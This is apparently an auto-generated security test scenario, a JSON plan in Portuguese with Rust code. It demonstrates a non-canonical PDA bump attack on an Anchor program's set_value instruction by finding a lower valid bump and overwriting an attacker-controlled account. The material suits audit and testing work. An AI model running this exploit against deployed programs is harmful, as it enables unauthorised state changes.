{
  "plan": "Preparo uma conta Data no endereco do PDA canonico derivado de [key.to_le_bytes(), bump_canonico] e chamo set_value legitimamente com o bump canonico para provar que o cenario esta correto. Em seguida, procuro o primeiro bump nao canonico (menor que o canonico) para o qual create_program_address retorna Ok, crio uma conta Data nesse endereco alternativo e chamo set_value com esse bump nao canonico. O efeito medido e que a conta no endereco alternativo teve seu value sobrescrito, demonstrando que o programa aceitou um PDA nao canonico.",
  "scenario": "let key: u64 = 42;
let new_value: u64 = 999;

// Deriva o PDA canonico
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[key.to_le_bytes().as_ref()], &env.program_id);

// Conta Data no PDA canonico
let data_account = account(&env.program_id, &anchor_account_data("Data", &(0u64,)), None);

// Baseline: uso legitimo com o bump canonico
let ix_baseline = env.anchor_ix("set_value", &(key, new_value, canonical_bump), vec![
    AccountMeta::new(canonical_pda, false),
]);
let contas_baseline = vec![
    (canonical_pda, data_account.clone()),
];
let r_base = env.baseline("set_value legitimo com bump canonico", &ix_baseline, &contas_baseline);

// Procura o primeiro bump nao canonico (menor que o canonico) que gera endereco valido
let mut non_canonical_bump: Option<u8> = None;
let mut non_canonical_pda: Option<Pubkey> = None;
let mut b = canonical_bump;
while b > 0 {
    b -= 1;
    if let Ok(addr) = Pubkey::create_program_address(&[key.to_le_bytes().as_ref(), &[b]], &env.program_id) {
        non_canonical_bump = Some(b);
        non_canonical_pda = Some(addr);
        break;
    }
}

if let (Some(bump_alt), Some(pda_alt)) = (non_canonical_bump, non_canonical_pda) {
    // Conta Data no endereco alternativo (controlada pelo atacante)
    let alt_account = account(&env.program_id, &anchor_account_data("Data", &(0u64,)), None);

    let ix_attack = env.anchor_ix("set_value", &(key, new_value, bump_alt), vec![
        AccountMeta::new(pda_alt, false),
    ]);
    let contas_attack = vec![
        (pda_alt, alt_account),
    ];

    let r = env.attack("set_value com bump nao canonico", &ix_attack, &contas_attack);
    if r.program_result == ProgramResult::Success {
        env.effect(
            "conta no endereco alternativo teve value sobrescrito",
            read_u64(after(&r, &pda_alt).data(), 8) == new_value,
        );
    }
}"
}

